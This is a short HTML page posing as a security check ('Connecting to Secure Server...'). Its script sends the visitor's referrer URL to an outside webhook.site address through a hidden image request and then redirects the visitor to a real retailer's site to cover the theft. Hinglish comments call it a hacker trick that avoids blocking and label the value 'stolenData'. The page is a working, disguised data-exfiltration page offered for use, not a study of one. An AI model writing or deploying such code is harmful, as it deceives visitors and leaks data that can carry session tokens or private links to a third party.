<!DOCTYPE html>
<html>
<head>
    <title>Checking Security...</title>
</head>
<body>
    <h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
        Connecting to Secure Server...
    </h2>

    <script>
        // 1. Asli Hacker Trick: Image tag ke zariye data bhejna (No Block)
        var leakUrl = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
        var stolenData = document.referrer; 

        if (stolenData) {
            var img = new Image();
            // Hum data ko URL ke sath chipka kar bhej rahe hain
            img.src = leakUrl + "?captured_url=" + encodeURIComponent(stolenData);
        }

        // 2. Phir user ko asli site par redirect kar dena
        setTimeout(function(){
            window.location.href = "https://www.cultbeauty.co.uk/";
        }, 2000);
    </script>
</body>
</html>
